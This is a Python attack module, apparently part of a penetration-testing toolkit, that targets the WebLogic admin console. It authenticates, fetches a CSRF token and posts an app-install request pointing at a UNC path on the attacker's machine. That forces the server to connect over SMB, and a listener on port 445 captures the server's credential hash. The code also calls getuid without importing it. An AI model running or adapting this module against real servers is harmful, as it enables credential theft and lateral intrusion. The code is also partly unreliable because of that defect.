from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from src.lib.cifstrap import Handler
from auxiliary import Auxiliary
from threading import Thread
from log import LOG
from re import findall
import socket
import utility


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ['Any']
        self.show = True
        self.flag = 'wl-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.title in [WINTERFACES.WLA]:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Same as JBoss/Tomcat
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/console/console.portal?AppApplicationInstallPortlet_actionOverride'\
              '=/com/bea/console/actions/app/install/appSelected'
        data = { "AppApplicationInstallPortletselectedAppPath" : 
                 "\\\\{0}\\fdas.war".format(utility.local_address()),
                 "AppApplicationInstallPortletfrsc" : None 
                }

        utility.Msg("Host %s:%s requires auth, checking.." % 
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint, True)
        
        if cookies[0]:

            utility.Msg("Setting up SMB listener...")
            self._Listen = True
            thread = Thread(target=self.smb_listener)
            thread.start()
            
            # fetch our CSRF
            data['AppApplicationInstallPortletfrsc'] = self.fetchCSRF(base, cookies[0])

            utility.Msg("Invoking UNC loader...")

            try:
                response = utility.requests_post(base+uri, data=data, cookies=cookies[0],
                                timeout=1.0)
            except:
                # we dont care about the response here
                pass
        else:
            utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

        while thread.is_alive():
            # spin
            pass

        self._Listen = False

    def fetchCSRF(self, base, cookie):
        """ Our install request requires a CSRF token
        """

        uri = '/console/console.portal?_nfpb=true&_pageLabel=AppApplicationInstallPage'

        response = utility.requests_get(base+uri, cookies=cookie)
        if response.status_code == 200:
            
            data = findall('AppApplicationInstallPortletfrsc" value="(.*?)"', 
                            response.content)
            if len(data) > 0:
                return data[0]

    def smb_listener(self):
        """ Setup the SMB listener
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                (con, addr) = sock.accept()
                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive() and self._Listen:
                    # spin...
                    pass

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()
